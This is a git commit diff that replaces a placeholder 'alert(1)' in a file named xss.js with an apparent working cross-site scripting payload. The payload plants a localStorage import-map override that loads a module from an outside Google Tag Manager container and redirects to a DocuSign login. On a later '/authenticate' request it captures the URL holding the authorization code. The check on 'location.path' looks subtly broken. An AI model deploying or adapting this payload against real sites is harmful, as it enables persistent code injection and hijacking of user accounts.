dcad45552f37a696c0bfd3af7d36de01aa45a804
CaTz <CaTzil@users.noreply.github.com>
2024-02-28 10:06:57 +0200

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,18 @@
-alert(1)
+const searchParams = new URLSearchParams(location.search);
+
+if(searchParams.has('code') && location.path ==='/authenticate') {
+  alert(location.href);
+  console.log(location.href);
+} else {
+  localStorage.setItem(
+    'import-map-overrides-external-maps',
+    JSON.stringify([
+      {
+        imports: {
+          '@zettle-bo/bootstrapper': 'https://www.googletagmanager.com/gtm.js?id=GTM-MWX3S387',
+        },
+      },
+    ])
+  );
+  location.href = 'https://account-d.docusign.com/'
+}
